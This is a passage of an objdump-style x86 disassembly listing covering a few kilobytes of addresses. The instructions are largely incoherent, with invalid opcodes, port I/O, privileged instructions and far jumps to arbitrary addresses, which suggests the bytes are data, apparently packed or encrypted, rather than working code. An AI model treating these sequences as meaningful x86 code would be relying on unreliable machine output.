  409773:	pop    ebp
  409774:	mov    bl,0x3e
  409776:	cli    
  409777:	xor    BYTE PTR cs:[eax+0x578a591],ch
  40977e:	push   0xffffffe3
  409780:	push   ss
  409781:	mov    bh,0xa
  409783:	loop   0x409802
  409785:	arpl   WORD PTR [edx+0x7c4a8440],bp
  40978b:	not    BYTE PTR [ebp+0x52]
  40978e:	push   edx
  40978f:	stc    
  409790:	push   ebx
  409791:	js     0x409742
  409793:	mov    WORD PTR [edx+0x47985995],fs
  409799:	aam    0xba
  40979b:	jbe    0x4097aa
  40979d:	jp     0x409722
  40979f:	hlt    
  4097a0:	push   ebp
  4097a1:	mov    ds:0x1ca1d917,eax
  4097a6:	xor    BYTE PTR [edx+eiz*1+0x9ceb7dd],0x5e
  4097ae:	push   ebp
  4097af:	adc    edx,0x5588a1b9
  4097b5:	cmpxchg BYTE PTR [ecx+0x1e862398],bh
  4097bc:	mov    ?,eax
  4097be:	enter  0x9a63,0x9f
  4097c2:	lahf   
  4097c3:	mov    ds:0xfd54c52c,eax
  4097c8:	dec    ecx
  4097c9:	inc    edi
  4097ca:	cmc    
  4097cb:	mov    esp,0x96b280af
  4097d0:	mov    cl,ch
  4097d2:	jb     0x4097bc
  4097d4:	mov    BYTE PTR [eax+ebx*8],0x8f
  4097d8:	dec    edi
  4097d9:	jmp    0x4097d4
  4097db:	bnd jge 0x4097ea
  4097de:	mov    ecx,0xebb40d9d
  4097e3:	pop    edi
  4097e4:	jne    0x40977d
  4097e6:	cmp    edx,DWORD PTR [esi]
  4097e8:	mov    ch,0x9a
  4097ea:	or     ah,bl
  4097ec:	pop    esp
  4097ed:	pop    eax
  4097ee:	stos   DWORD PTR es:[edi],eax
  4097ef:	ins    DWORD PTR es:[edi],dx
  4097f0:	shr    BYTE PTR [eax+eiz*8],1
  4097f3:	jle    0x409852
  4097f5:	fs in  al,dx
  4097f7:	and    dl,BYTE PTR ds:0x2f0f9dd1
  4097fd:	mov    esp,0xd615a5cf
  409802:	cmp    al,bh
  409804:	mov    ecx,0x797fe31a
  409809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40980a:	push   cs
  40980b:	pop    esi
  40980c:	adc    eax,0x9d8c052
  409811:	(bad)  
  409813:	xor    DWORD PTR [ebp+0x1f],esp
  409816:	cmc    
  409817:	test   al,0x58
  409819:	leave  
  40981a:	or     BYTE PTR [eax],al
  40981c:	lds    eax,FWORD PTR [eax*2+0x64de3ea]
  409823:	jmp    0x4aec9a08
  409828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409829:	mov    ?,ecx
  40982b:	rcr    BYTE PTR [eax+0x36960c8e],0xe
  409832:	xchg   ebx,eax
  409833:	jae    0x4097dd
  409835:	dec    esi
  409836:	retf   
  409837:	and    BYTE PTR [esi+0x5d],0xb9
  40983b:	sahf   
  40983c:	imul   ecx,DWORD PTR [edx],0x95f5b7d4
  409842:	or     DWORD PTR [esi],edi
  409844:	aaa    
  409845:	cdq    
  409846:	mov    ebx,0x79837556
  40984b:	shr    BYTE PTR [edi+0x4cf82d20],cl
  409851:	push   eax
  409852:	xchg   ecx,eax
  409853:	retf   
  409854:	outs   dx,BYTE PTR ds:[esi]
  409855:	scas   al,BYTE PTR es:[edi]
  409856:	add    dl,BYTE PTR [esi-0x68f2c548]
  40985c:	ss dec eax
  40985e:	inc    ebx
  40985f:	push   edx
  409860:	imul   esp,DWORD PTR [edi+0x65],0x5b
  409864:	lods   eax,DWORD PTR ds:[esi]
  409865:	sub    al,0x98
  409867:	test   eax,0xa2bba228
  40986c:	ins    BYTE PTR es:[edi],dx
  40986d:	sub    bh,ah
  40986f:	dec    ecx
  409870:	cmp    al,0xa
  409872:	xchg   ebx,eax
  409873:	fs ror ebp,1
  409876:	std    
  409877:	repz xchg ebp,eax
  409879:	pop    ebp
  40987a:	or     ecx,esp
  40987c:	sbb    eax,0xef16e48c
  409881:	xchg   ebp,eax
  409882:	jl     0x4098d4
  409884:	mov    ch,0xc1
  409886:	hlt    
  409887:	cmp    DWORD PTR [edi-0x4a],ecx
  40988a:	cmp    bh,BYTE PTR [eax-0x55345edf]
  409890:	ins    DWORD PTR es:[edi],dx
  409891:	and    DWORD PTR [eax+eax*8+0x67bac18b],ecx
  409898:	xchg   ebx,eax
  409899:	cmp    al,0x17
  40989b:	mov    ecx,edx
  40989d:	pop    es
  40989e:	sub    BYTE PTR [edi-0x3667dd4f],dl
  4098a4:	ss jbe 0x4098a6
  4098a7:	cmp    edx,ebx
  4098a9:	jg     0x4098f1
  4098ab:	ins    DWORD PTR es:[edi],dx
  4098ac:	jae    0x409853
  4098ae:	sbb    al,0x63
  4098b0:	xchg   ecx,eax
  4098b1:	ret    
  4098b2:	pop    eax
  4098b3:	jnp    0x40989f
  4098b5:	lods   eax,DWORD PTR ds:[esi]
  4098b6:	push   ecx
  4098b7:	jl     0x409883
  4098b9:	fcmovu st,st(5)
  4098bb:	clc    
  4098bc:	(bad)  
  4098bd:	(bad)  [ecx+0xf]
  4098c0:	jno    0x4098d9
  4098c2:	in     eax,0xa9
  4098c4:	fimul  WORD PTR [ecx+eiz*8]
  4098c7:	ficomp DWORD PTR [edi+edx*4+0x7ab78a45]
  4098ce:	clc    
  4098cf:	(bad)  
  4098d0:	test   BYTE PTR [ecx-0x48338c03],0xe7
  4098d7:	ficomp WORD PTR [esi+0x31b16c95]
  4098dd:	sahf   
  4098de:	aam    0xda
  4098e0:	ficom  WORD PTR [esi+0x305f2795]
  4098e6:	push   0xffffffb0
  4098e8:	test   DWORD PTR [esi+0x72d64],edx
  4098ee:	mov    ecx,0x16f9b00
  4098f3:	jl     0x409961
  4098f5:	jo     0x409942
  4098f7:	add    al,0x12
  4098f9:	xor    al,0x91
  4098fb:	cmp    eax,0xf7eab97a
  409900:	push   es
  409901:	xchg   esi,eax
  409902:	fcom   DWORD PTR [ecx-0x1c]
  409905:	mov    bh,0x4f
  409907:	fistp  QWORD PTR [edi+0x3bcb604f]
  40990d:	xlat   BYTE PTR ds:[ebx]
  40990e:	and    ecx,DWORD PTR ss:[edi]
  409911:	ds jecxz 0x4098e5
  409914:	push   edi
  409915:	stc    
  409916:	dec    eax
  409917:	test   eax,0x392276cb
  40991c:	adc    DWORD PTR ds:0xc8d09ecc,0x7f23f137
  409926:	cli    
  409927:	fisubr WORD PTR [bx+si-0x26]
  40992b:	hlt    
  40992c:	mov    edx,0x5b68b34f
  409931:	cmp    al,0x38
  409933:	ficom  DWORD PTR [eax-0x5401f34c]
  409939:	mov    WORD PTR [ecx],?
  40993b:	cs cwde 
  40993d:	sub    ebx,DWORD PTR [ecx]
  40993f:	lds    eax,FWORD PTR [eax-0x2d]
  409942:	push   esi
  409943:	cmp    eax,0xe2baa0b3
  409948:	retf   0xe692
  40994b:	retf   
  40994c:	sbb    eax,0x311f39b5
  409951:	stos   BYTE PTR es:[edi],al
  409952:	mov    ah,0xf5
  409954:	add    DWORD PTR [edi],0x10
  409957:	jae    0x409942
  409959:	sub    DWORD PTR [edi],esi
  40995b:	jns    0x4099d1
  40995d:	jbe    0x40993f
  40995f:	js     0x40995e
  409961:	pop    esi
  409962:	jp     0x40991c
  409964:	call   0x4b1e:0x30941e76
  40996b:	xchg   edi,eax
  40996c:	mov    BYTE PTR [esi-0x14],dl
  40996f:	std    
  409970:	adc    eax,0x75b25de9
  409975:	push   es
  409976:	or     BYTE PTR ds:[esi+0x21],0xec
  40997b:	mov    edi,DWORD PTR [ecx]
  40997d:	inc    ebx
  40997e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40997f:	mov    esp,0x3077a397
  409984:	imul   ecx,DWORD PTR [ecx+ecx*1+0x15005911],0x47
  40998c:	je     0x409956
  40998e:	lods   eax,DWORD PTR ds:[esi]
  40998f:	push   ebp
  409990:	add    esp,DWORD PTR [ebp+0x62]
  409993:	(bad)  
  409994:	imul   ebx,DWORD PTR [ebp+0x683675df],0xffffffb5
  40999b:	or     eax,0x65ea2e53
  4099a0:	and    dl,bh
  4099a2:	jl     0x409989
  4099a4:	std    
  4099a5:	mov    eax,0x7b428f17
  4099aa:	loop   0x4099fd
  4099ac:	cmp    DWORD PTR [ecx+0x3b730e9e],eax
  4099b2:	pushf  
  4099b3:	and    ah,ch
  4099b5:	into   
  4099b6:	mov    eax,ds:0xed9f8c5d
  4099bb:	mov    ah,0xf4
  4099bd:	(bad)  
  4099be:	jle    0x409a21
  4099c0:	shr    DWORD PTR [esi+0x40f6bc4c],0x2b
  4099c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c8:	pop    di
  4099ca:	inc    ecx
  4099cb:	stos   DWORD PTR es:[edi],eax
  4099cc:	and    eax,0xdcd84e92
  4099d1:	and    ch,BYTE PTR [edx-0x61]
  4099d4:	mov    ecx,0x9bbfd0d2
  4099d9:	in     eax,0xe8
  4099db:	aam    0x44
  4099dd:	mov    edi,0xbbb81e94
  4099e2:	adc    al,0xe
  4099e4:	adc    eax,0x7764f45
  4099e9:	std    
  4099ea:	or     esp,DWORD PTR [ebp-0x15e66839]
  4099f0:	push   ecx
  4099f1:	adc    BYTE PTR [eax+0x33],al
  4099f4:	stos   DWORD PTR es:[edi],eax
  4099f5:	ret    
  4099f6:	xchg   edx,eax
  4099f7:	jmp    0xd1c9a8c
  4099fc:	cmc    
  4099fd:	repz xor dl,BYTE PTR [esi-0x26]
  409a01:	xchg   edx,eax
  409a02:	fistp  DWORD PTR [ebp+0x5fccab61]
  409a08:	dec    ecx
  409a09:	jecxz  0x409a6b
  409a0b:	fsubr  st,st(7)
  409a0d:	dec    ecx
  409a0e:	cli    
  409a0f:	ja     0x4099c7
  409a11:	bound  edi,QWORD PTR [eax]
  409a13:	in     al,0xea
  409a15:	popa   
  409a16:	(bad)  
  409a18:	not    ecx
  409a1a:	imul   eax,ecx,0xf769812d
  409a20:	pop    ecx
  409a22:	mov    dh,0xd3
  409a24:	repnz inc ecx
  409a26:	sub    BYTE PTR [edx],bh
  409a28:	cmp    esi,DWORD PTR [ebp+0x69a6482f]
  409a2e:	jmp    FWORD PTR [ebp+0x62]
  409a31:	jo     0x409a6a
  409a33:	dec    esi
  409a34:	and    ch,bl
  409a36:	div    DWORD PTR [ebp-0x2d]
  409a39:	xchg   edi,eax
  409a3a:	in     eax,0xa8
  409a3c:	sub    eax,0xe52b859f
  409a41:	jne    0x409a98
  409a43:	das    
  409a44:	out    0xc0,eax
  409a46:	scas   al,BYTE PTR es:[edi]
  409a47:	psubsw mm3,QWORD PTR [esi+0x55aa87a2]
  409a4e:	inc    eax
  409a4f:	xor    bl,BYTE PTR [ebx-0x2b]
  409a52:	xor    edi,DWORD PTR [ecx+ecx*8+0x7220788d]
  409a59:	(bad)  
  409a5a:	out    0x33,eax
  409a5c:	mov    ds:0x3d9adc0a,eax
  409a61:	sub    cl,bl
  409a63:	cli    
  409a64:	bnd jle 0x409a2f
  409a67:	adc    al,0x27
  409a69:	xchg   edi,eax
  409a6a:	sbb    dh,ah
  409a6c:	sbb    al,0xb9
  409a6e:	jp     0x409ae6
  409a70:	dec    ebx
  409a71:	lods   al,BYTE PTR ds:[esi]
  409a72:	sahf   
  409a73:	leave  
  409a74:	cs retf 
  409a76:	sub    DWORD PTR [eax+0x78],eax
  409a79:	mov    dh,0x26
  409a7b:	inc    esp
  409a7c:	xchg   edi,eax
  409a7d:	fbld   TBYTE PTR [ecx]
  409a7f:	imul   ecx,ebp,0x32b5e637
  409a85:	dec    edi
  409a86:	mov    DWORD PTR [ebx+ebx*8+0x7c],ecx
  409a8a:	jbe    0x409a3a
  409a8c:	stc    
  409a8d:	dec    esi
  409a8e:	imul   edi,DWORD PTR [ebx+0x18daaa77],0x84364aff
  409a98:	adc    esi,DWORD PTR [edx-0x2eb68ef8]
  409a9e:	adc    eax,0xe341a4d4
  409aa3:	xchg   edx,eax
  409aa4:	dec    edi
  409aa5:	(bad)  
  409aa6:	ss and ah,ch
  409aa9:	cmp    DWORD PTR [esi],ecx
  409aab:	and    al,0x44
  409aad:	dec    eax
  409aae:	and    esp,DWORD PTR [edx+0x335b1ee]
  409ab4:	mov    edx,0xe301f622
  409ab9:	in     eax,dx
  409aba:	push   esi
  409abb:	ret    0xa77c
  409abe:	pop    eax
  409abf:	push   edx
  409ac0:	mov    bl,0x5f
  409ac2:	pop    esp
  409ac3:	hlt    
  409ac4:	or     eax,0x1bfd40ed
  409ac9:	adc    edx,DWORD PTR [ebp+0x33]
  409acc:	gs data16 mov dh,0x2
  409ad0:	and    DWORD PTR [edi+0x61c3881a],esi
  409ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ad7:	scas   eax,DWORD PTR es:[edi]
  409ad8:	jecxz  0x409abf
  409ada:	xchg   esp,eax
  409adb:	mov    cx,0xa161
  409adf:	cdq    
  409ae0:	dec    esp
  409ae1:	push   edx
  409ae2:	clc    
  409ae3:	(bad)  
  409ae4:	aad    0x90
  409ae6:	bound  ebp,QWORD PTR [ebx+edi*2-0x55]
  409aea:	(bad)  
  409aeb:	aam    0x1b
  409aed:	fldcw  WORD PTR [edi]
  409aef:	rcl    esi,cl
  409af1:	xchg   esp,eax
  409af2:	xchg   edi,eax
  409af3:	mov    ebx,0x41a06e16
  409af8:	fstp   DWORD PTR [ebx-0x5b]
  409afb:	sbb    DWORD PTR [ecx-0x7d],esi
  409afe:	jp     0x409aa5
  409b00:	pop    esp
  409b01:	xchg   esp,eax
  409b02:	aad    0x4c
  409b04:	out    dx,eax
  409b05:	push   0x35e375c8
  409b0a:	adc    eax,0x6e26a74d
  409b0f:	add    ah,cl
  409b11:	call   0xcdd7:0x71a09d3a
  409b18:	mov    dh,0xe6
  409b1a:	dec    DWORD PTR [eax+0x5a70c116]
  409b20:	xor    eax,0xe0ab7a67
  409b25:	lods   eax,DWORD PTR ds:[esi]
  409b26:	outs   dx,BYTE PTR ds:[esi]
  409b27:	sbb    DWORD PTR [ebp-0x7c484a7],edx
  409b2d:	lds    ebx,FWORD PTR [eax-0x1b35f27e]
  409b33:	pop    eax
  409b34:	int3   
  409b35:	adc    esi,edi
  409b37:	pop    ss
  409b38:	cs inc ecx
  409b3a:	lahf   
  409b3b:	shl    DWORD PTR [eax-0x6],1
  409b3e:	mul    edx
  409b40:	xor    al,0xff
  409b42:	imul   eax,DWORD PTR [ebx+0x7c02f7d],0xffffffd9
  409b49:	cmp    esp,DWORD PTR [ebp+ebp*1-0x50]
  409b4d:	cmp    ebx,edx
  409b4f:	jl     0x409b83
  409b51:	out    0xd7,al
  409b53:	daa    
  409b54:	cdq    
  409b55:	push   edi
  409b56:	test   eax,0x9ff1733b
  409b5b:	imul   edx,DWORD PTR [ebp-0x66d82e35],0xbe68d63
  409b65:	call   0x7d918065
  409b6a:	xchg   ebp,eax
  409b6b:	in     al,0xff
  409b6d:	jmp    0x409bc7
  409b6f:	pop    eax
  409b70:	out    dx,eax
  409b71:	call   0xf8a:0xe3ea9e6c
  409b78:	mov    bh,0xf8
  409b7a:	jns    0x409be0
  409b7c:	add    DWORD PTR [ebx],ebx
  409b7e:	pop    esi
  409b7f:	add    BYTE PTR [edx],dl
  409b81:	jp     0x409b5b
  409b83:	or     bl,BYTE PTR [ebp-0x34146711]
  409b89:	(bad)  
  409b8a:	mov    bh,0x82
  409b8c:	inc    edi
  409b8d:	mov    ?,WORD PTR [edx-0x4]
  409b90:	pop    edx
  409b91:	jno    0x409b5e
  409b93:	add    al,0x94
  409b95:	arpl   WORD PTR fs:[ebp+0x45],dx
  409b99:	rdmsr  
  409b9b:	dec    ebx
  409b9c:	jp     0x409b83
  409b9e:	out    dx,al
  409b9f:	arpl   WORD PTR [edx+0x754e5493],si
  409ba5:	cmp    bl,dl
  409ba7:	aaa    
  409ba8:	popf   
  409ba9:	pop    edi
  409baa:	aas    
  409bab:	fwait
  409bac:	loopne 0x409c22
  409bae:	(bad)  
  409baf:	jno    0x409b48
  409bb1:	jo     0x409bb8
  409bb3:	mov    eax,ds:0xdb5f763d
  409bb8:	cmp    ah,BYTE PTR ds:[ecx+0x1a]
  409bbc:	inc    ebp
  409bbd:	jecxz  0x409b9a
  409bbf:	aas    
  409bc0:	ins    BYTE PTR es:[edi],dx
  409bc1:	jne    0x409bf6
  409bc3:	mov    bl,0xb4
  409bc5:	jmp    0xd43201e8
  409bca:	dec    ebx
  409bcb:	cmp    eax,DWORD PTR [edx]
  409bcd:	adc    ch,dh
  409bcf:	sti    
  409bd0:	and    BYTE PTR ds:0x9e455d15,cl
  409bd6:	inc    ax
  409bd8:	(bad)  
  409bd9:	pushf  
  409bda:	dec    eax
  409bdb:	jp     0x409b66
  409bdd:	out    dx,eax
  409bde:	enter  0x75f0,0x63
  409be2:	test   BYTE PTR [esi],dh
  409be4:	and    al,0x61
  409be6:	cwde   
  409be7:	retf   
  409be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be9:	mov    ebx,0x6e2903c5
  409bee:	pop    ds
  409bef:	sub    BYTE PTR [edx],dh
  409bf1:	je     0x409c13
  409bf3:	mov    edx,0x8e3bbaff
  409bf8:	push   edi
  409bf9:	fwait
  409bfa:	js     0x409c4e
  409bfc:	lea    esi,[esi]
  409bfe:	add    ebx,DWORD PTR [eax+esi*4]
  409c01:	loopne 0x409c39
  409c03:	mov    ecx,0xd1e0e063
  409c08:	pop    ds
  409c09:	int    0xb0
  409c0b:	aas    
  409c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0d:	sub    al,0xab
  409c0f:	imul   ebp,DWORD PTR [esi],0x3b90e315
  409c15:	sub    ah,BYTE PTR [ebp+eiz*1+0x21]
  409c19:	jae    0x409c8d
  409c1b:	mov    bh,0x14
  409c1d:	xchg   ebp,eax
  409c1e:	int3   
  409c1f:	mov    edi,0xf48313b9
  409c24:	dec    esp
  409c25:	xlat   BYTE PTR ds:[ebx]
  409c26:	cli    
  409c27:	add    DWORD PTR [ebx],esi
  409c29:	sbb    BYTE PTR [eax-0x51],bh
  409c2c:	jmp    0x8f18e65d
  409c31:	or     al,0x66
  409c33:	mov    ah,0xa9
  409c35:	inc    ebp
  409c36:	push   eax
  409c37:	jmp    0xfbd4:0x33e4bc00
  409c3e:	scas   al,BYTE PTR es:[edi]
  409c3f:	out    0x94,eax
  409c41:	je     0x409c8a
  409c43:	(bad)  
  409c45:	mov    eax,ds:0x97d7ceb7
  409c4a:	and    al,0xaf
  409c4c:	jmp    0x409c0e
  409c4e:	or     al,cl
  409c50:	push   edi
  409c51:	xchg   ebx,eax
  409c52:	(bad)
  409c55:	sbb    esp,ecx
  409c57:	lods   eax,DWORD PTR ds:[esi]
  409c58:	add    BYTE PTR ds:0xe4398b9,bh
  409c5e:	mov    al,0x85
  409c60:	ss xchg dh,bl
  409c63:	aas    
  409c64:	mov    al,0xc9
  409c66:	pop    ss
  409c67:	(bad)  
  409c68:	cli    
  409c69:	push   esi
  409c6a:	pop    eax
  409c6b:	mov    bh,0xff
  409c6d:	lods   al,BYTE PTR ds:[esi]
  409c6e:	sub    eax,0xd1a423b3
  409c73:	adc    ecx,DWORD PTR [eax+0x735909b8]
  409c79:	sbb    al,0x3
  409c7b:	fild   DWORD PTR [ebp-0x13]
  409c7e:	sbb    DWORD PTR [ebx-0x78053323],ebp
  409c84:	loope  0x409cf4
  409c86:	mov    edx,0xec78794f
  409c8b:	in     eax,dx
  409c8c:	in     al,0xb0
  409c8e:	sub    al,0x3c
  409c90:	cdq    
  409c91:	aad    0x96
  409c93:	retf   0xb144
  409c96:	lods   al,BYTE PTR ds:[esi]
  409c97:	push   eax
  409c98:	push   edi
  409c99:	aas    
  409c9a:	xor    edi,DWORD PTR [ebx-0x7af83876]
  409ca0:	pop    ebx
  409ca1:	lahf   
  409ca2:	mov    bh,0x9d
  409ca4:	push   ebp
  409ca5:	scas   eax,DWORD PTR es:[edi]
  409ca6:	xchg   BYTE PTR [ecx+0x6e],al
  409ca9:	(bad)
  409cac:	imul   ebp,esp,0xef6d37bc
  409cb2:	jmp    FWORD PTR [ebx]
  409cb4:	inc    edi
  409cb5:	leave  
  409cb6:	sbb    eax,0xb31cd6b2
  409cbb:	push   cs
  409cbc:	clc    
  409cbd:	daa    
  409cbe:	push   edi
  409cbf:	pop    ebx
  409cc0:	push   ebp
  409cc1:	push   edx
  409cc2:	cwde   
  409cc3:	test   eax,ecx
  409cc5:	es (bad) 
  409cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc8:	cdq    
  409cc9:	test   eax,0x972bd796
  409cce:	stos   BYTE PTR es:[edi],al
  409ccf:	outs   dx,BYTE PTR ds:[esi]
  409cd0:	push   ss
  409cd1:	push   ecx
  409cd2:	loope  0x409c88
  409cd4:	jl     0x409c88
  409cd6:	(bad)
  409cd9:	jecxz  0x409cee
  409cdb:	rcl    al,0xdc
  409cde:	mov    al,0xc
  409ce0:	mov    bh,0x86
  409ce2:	inc    esi
  409ce3:	push   edx
  409ce4:	dec    ecx
  409ce5:	add    dl,BYTE PTR [eax+eiz*1-0x6c94857d]
  409cec:	push   0x3c
  409cee:	sub    BYTE PTR [esi],dh
  409cf0:	call   0xb26b00fd
  409cf5:	inc    eax
  409cf6:	arpl   WORD PTR [edx+0x5a0fbc19],cx
  409cfc:	pop    ecx
  409cfd:	or     al,0xbb
  409cff:	out    dx,al
  409d00:	cmp    ebx,DWORD PTR [esi+0x295ede80]
  409d06:	into   
  409d07:	jmp    0x409d04
  409d09:	mov    ebp,0xb0124b0c
  409d0e:	pop    ss
  409d0f:	sar    DWORD PTR [ebp+0x6c],1
  409d12:	mov    eax,0xe2f5c4df
  409d17:	push   cs
  409d18:	push   ss
  409d19:	mov    esi,0x3079be0e
  409d1e:	imul   ebp,DWORD PTR [ebx-0x6b1d70df],0xd3b33524
  409d28:	jb     0x409cb5
  409d2a:	fldenv [esi]
  409d2c:	rcr    BYTE PTR [esi+0x183ec826],1
  409d32:	int3   
  409d33:	inc    edi
  409d34:	test   BYTE PTR [edx+ecx*4],ch
  409d37:	dec    ebp
  409d38:	sti    
  409d39:	jae    0x409cf9
  409d3b:	bound  edi,QWORD PTR [edx]
  409d3d:	hlt    
  409d3e:	int    0x1c
  409d40:	loop   0x409d23
  409d42:	sbb    esp,0x1b
  409d45:	cld    
  409d46:	push   edi
  409d47:	in     al,0xe4
  409d49:	mov    ebp,0x90f2636b
  409d4e:	jle    0x409d8c
  409d50:	out    0x7c,eax
  409d52:	enter  0xb9a3,0xa1
  409d56:	enter  0xc3dd,0xb6
  409d5a:	in     eax,dx
  409d5b:	mov    dh,0xb9
  409d5d:	dec    eax
  409d5e:	pop    esp
  409d5f:	in     eax,0x4b
  409d61:	aad    0x76
  409d63:	add    al,0x58
  409d65:	add    DWORD PTR [edi-0x6a],ebp
  409d68:	add    BYTE PTR [edi+0x6ba38e04],ch
  409d6e:	and    dl,bh
  409d70:	xor    BYTE PTR [ebp+0x54],0xdb
  409d74:	ret    
  409d75:	add    al,0x2c
  409d77:	dec    edi
  409d78:	shl    DWORD PTR [eax+0x55],0x13
  409d7c:	lds    ecx,FWORD PTR ds:0x152d36a1
  409d82:	xor    cl,bh
  409d84:	mov    eax,0xeea99f9d
  409d89:	stc    
  409d8a:	xor    edi,esp
  409d8c:	sbb    DWORD PTR [esi+0x621342de],edi
  409d92:	lds    edx,FWORD PTR [ebp-0x3ab06284]
  409d98:	aam    0x6a
  409d9a:	add    esi,DWORD PTR [edi]
  409d9c:	shl    DWORD PTR [ecx],1
  409d9e:	leave  
  409d9f:	fwait
  409da0:	inc    esi
  409da1:	jmp    0x2275b5b0
  409da6:	mov    al,0x37
  409da8:	dec    edx
  409da9:	dec    ebx
  409daa:	push   cs
  409dab:	cmp    bh,al
  409dad:	mov    esp,0x171d6791
  409db2:	pop    es
  409db3:	sub    BYTE PTR [edx],ch
  409db5:	aam    0xc2
  409db7:	mov    dh,0x7d
  409db9:	leave  
  409dba:	dec    ecx
  409dbb:	xchg   edi,eax
  409dbc:	or     esi,eax
  409dbe:	inc    BYTE PTR [edx]
  409dc0:	jb     0x409d9c
  409dc2:	ds add al,0x80
  409dc5:	scas   eax,DWORD PTR es:[edi]
  409dc6:	pop    ecx
  409dc7:	cmp    al,0x4c
  409dc9:	pop    esp
  409dca:	bound  eax,QWORD PTR [esi+0x2e]
  409dcd:	sar    BYTE PTR [esi+edx*1-0x24],1
  409dd1:	adc    ebp,edi
  409dd3:	push   DWORD PTR [eax]
  409dd5:	dec    ecx
  409dd6:	ss and eax,0xa488220d
  409ddc:	(bad)  
  409dde:	ja     0x409dfe
  409de0:	in     eax,dx
  409de1:	pop    ebx
  409de2:	mov    ds:0x5497cb31,eax
  409de7:	imul   DWORD PTR [ebx]
  409de9:	ins    BYTE PTR es:[edi],dx
  409dea:	push   esp
  409deb:	xchg   ecx,eax
  409dec:	xor    DWORD PTR [esi-0x6d],0x2d
  409df0:	or     eax,0x234b01ea
  409df5:	or     eax,0xea616ad2
  409dfa:	daa    
  409dfb:	outs   dx,BYTE PTR ds:[esi]
  409dfc:	(bad)  
  409dfd:	fstp   QWORD PTR [ebp-0x762ec088]
  409e03:	inc    esi
  409e04:	xor    edx,DWORD PTR [ebx+0x3466203f]
  409e0a:	jp     0x409db4
  409e0c:	repnz sub edx,ebx
  409e0f:	dec    eax
  409e10:	add    DWORD PTR [ecx-0xb],ebp
  409e13:	adc    ch,ah
  409e15:	out    dx,eax
  409e16:	popf   
  409e17:	arpl   WORD PTR [ecx+0x65db98fb],cx
  409e1d:	std    
  409e1e:	aaa    
  409e1f:	cmc    
  409e20:	int3   
  409e21:	es sub dh,bl
  409e24:	sub    dh,BYTE PTR [edx-0x52]
  409e27:	stc    
  409e28:	repz pop edi
  409e2a:	les    esp,FWORD PTR [esi+ecx*2]
  409e2d:	inc    ecx
  409e2e:	lods   al,BYTE PTR ds:[esi]
  409e2f:	(bad)  
  409e30:	cld    
  409e31:	out    dx,eax
  409e32:	pop    ds
  409e33:	sbb    eax,DWORD PTR [ecx]
  409e35:	or     BYTE PTR [edi+0x52],bh
  409e38:	aad    0xf9
  409e3a:	xchg   esp,edx
  409e3c:	jae    0x409de4
  409e3e:	mov    dl,0x9
  409e40:	mov    bl,0x50
  409e42:	and    DWORD PTR [esi],0xffffffa8
  409e45:	jns    0x409ea3
  409e47:	mov    ecx,ebx
  409e49:	xchg   ecx,eax
  409e4a:	mov    edx,0xe53d247b
  409e4f:	cli    
  409e50:	sub    BYTE PTR [eax-0x662b8568],cl
  409e56:	in     al,dx
  409e57:	sti    
  409e58:	pop    eax
  409e59:	xor    BYTE PTR [esi+0x31051786],ah
  409e5f:	xchg   DWORD PTR [esi+0x65],ebp
  409e62:	pop    esp
  409e63:	jne    0x409e5d
  409e65:	clc    
  409e66:	lea    ecx,[esi+0x1a24ff80]
  409e6c:	sub    DWORD PTR [eax+0x1f2edb4f],edi
  409e72:	cld    
  409e73:	arpl   WORD PTR [edi+0xe],di
  409e76:	lock imul ebp,ebx,0xffffffc9
  409e7a:	mov    ecx,0xccde23e9
  409e7f:	add    edx,esp
  409e81:	push   edi
  409e82:	cs push eax
  409e84:	add    eax,DWORD PTR [edi+esi*8+0x7bb9e85]
  409e8b:	call   0x24e8:0x53522777
  409e92:	pop    WORD PTR [edi-0x7]
  409e96:	fidiv  WORD PTR [ebx+ecx*4]
  409e99:	push   0xe49df82e
  409e9e:	adc    edx,ecx
  409ea0:	mov    ds:0xb057a333,al
  409ea5:	xor    esi,edi
  409ea7:	add    dl,BYTE PTR [ebx+0x36]
  409eaa:	(bad)  
  409eab:	pop    esp
  409eac:	xlat   BYTE PTR ds:[ebx]
  409ead:	fistp  WORD PTR [edi+0x13c6ff87]
  409eb3:	dec    edi
  409eb4:	add    bh,dl
  409eb6:	dec    esp
  409eb7:	jbe    0x409e70
  409eb9:	jle    0x409ece
  409ebb:	clc    
  409ebc:	mov    eax,ds:0x43478b0f
  409ec1:	scas   al,BYTE PTR es:[edi]
  409ec2:	adc    eax,0x9d003300
  409ec7:	inc    eax
  409ec8:	sub    edi,DWORD PTR [edi+edi*4]
  409ecb:	xchg   esp,eax
  409ecc:	or     eax,DWORD PTR [ecx+0x1665d2d9]
  409ed2:	adc    eax,0x40199c92
  409ed7:	pop    eax
  409ed8:	mov    ah,0xbb
  409eda:	loop   0x409e79
  409edc:	arpl   WORD PTR [eax-0x12c0f503],dx
  409ee2:	add    DWORD PTR [eax-0x4dd0c1ed],ecx
  409ee8:	sub    ebx,ebx
  409eea:	outs   dx,BYTE PTR ds:[esi]
  409eeb:	mov    ebp,0x6ccb6771
  409ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ef1:	(bad)  
  409ef2:	push   esp
  409ef3:	jbe    0x409f38
  409ef5:	dec    ebx
  409ef6:	sbb    al,0xb1
  409ef8:	add    eax,0x7c37fb2b
  409efd:	ret    
  409efe:	add    DWORD PTR [edi+0x189fbc3],ebx
  409f04:	xchg   esp,eax
  409f05:	sub    DWORD PTR [ebx-0x400feba],edx
  409f0b:	jle    0x409ede
  409f0d:	cmp    edi,DWORD PTR [ebx+0x60f6e236]
  409f13:	mov    dh,0x81
  409f15:	fmulp  st(3),st
  409f17:	in     al,dx
  409f18:	push   0x6f
  409f1a:	mov    edx,DWORD PTR [ebp+0x59]
  409f1d:	nop
  409f1e:	bound  ebp,QWORD PTR [esi-0x2936616e]
  409f24:	loope  0x409ec4
  409f26:	sar    BYTE PTR [edx],1
  409f28:	mov    esi,0x6bf97b07
  409f2d:	push   esp
  409f2e:	push   eax
  409f2f:	push   ecx
  409f30:	outs   dx,DWORD PTR ds:[esi]
  409f31:	cmp    BYTE PTR [esi],ch
